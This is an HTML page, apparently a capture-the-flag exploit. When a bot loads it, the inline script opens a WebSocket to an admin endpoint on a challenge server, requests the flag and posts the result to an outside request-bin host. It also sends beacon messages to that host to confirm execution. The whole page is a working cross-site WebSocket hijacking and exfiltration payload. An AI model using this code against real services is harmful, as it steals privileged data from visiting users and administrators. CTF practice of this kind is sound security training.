<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Flag Retrieval</title>
</head>
<body>
    <script>
        // Logging interaction with RequestBin to confirm bot access
        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "Bot accessed HTML page" })
        });

        // WebSocket connection to retrieve flag
        const ws = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws');
        
        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "After creating WS" })
        });
        
        ws.onopen = () => {
            ws.send('flag');  // Request the flag
        };

        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "After sending flag re" })
        });

        ws.onmessage = (event) => {
            const flag = event.data;
            console.log("Flag:", flag);

            // Send the flag back to RequestBin
            fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ flag: flag })
            });

            ws.close();
        };

        ws.onerror = (error) => {
            console.error("WebSocket error:", error);
        };
    </script>
</body>
</html>
